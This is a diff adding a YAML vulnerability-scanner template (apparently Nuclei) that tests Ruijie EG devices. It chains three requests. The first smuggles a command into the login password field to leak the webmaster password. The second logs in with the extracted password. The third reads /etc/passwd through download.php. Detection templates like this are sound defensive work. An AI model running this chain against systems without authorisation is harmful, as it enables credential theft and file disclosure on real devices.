@@ -1,0 +1,84 @@
+id: ruijie-eg-file-read
+
+info:
+  name: Ruijie Eg File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    Possible file read vulnerability in Ruijie EG.
+
+variables:
+  extracted_password: ''
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - '{{BaseURL}}/login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: username=admin&password=admin?show+webmaster+user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - content-type
+          - text/json
+    extractors:
+      - type: regex
+        name: extracted_password
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '{"data":".*admin\\s?(?P<password>[^\\\\"]*)"'
+
+  - id: step-2
+    method: POST
+    path:
+      - '{{BaseURL}}/login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: username=admin&password={{extracted_password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - content-type
+          - text/json
+          - Set-Cookie
+          - user=admin
+      - type: word
+        part: body
+        words:
+          - '{"data":"0","status":1}'
+
+  - id: step-3
+    method: POST
+    path:
+      - '{{BaseURL}}/download.php?a=read_txt'
+    body: file=/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"status":true,'
+      - type: regex
+        regex:
+          - 'root:[x*]?:0:0:'
